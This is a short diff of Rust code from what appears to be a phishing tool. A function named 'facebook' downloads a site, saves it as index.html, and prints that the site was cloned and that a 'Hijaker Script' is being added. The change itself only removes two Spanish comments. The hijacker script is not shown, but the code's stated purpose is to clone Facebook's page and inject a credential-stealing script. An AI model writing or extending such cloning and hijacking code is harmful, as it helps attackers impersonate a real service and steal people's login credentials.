@@ -32,11 +32,10 @@ pub fn facebook(iplocal: &str) {
     match response {
         Ok(mut res) => {
             if res.status().is_success() {
-                // Lee el contenido de la respuesta
+ 
                 let mut body = Vec::new();
                 res.read_to_end(&mut body).expect("No se pudo leer la respuesta");
-                
-                // Guarda el contenido en un archivo index.html
+                 
                 let mut file = File::create("index.html").expect("No se pudo crear el archivo");
                 file.write_all(&body).expect("No se pudo escribir en el archivo");
                 println!("Site cloned successfully\nAdding Hijaker Script...");
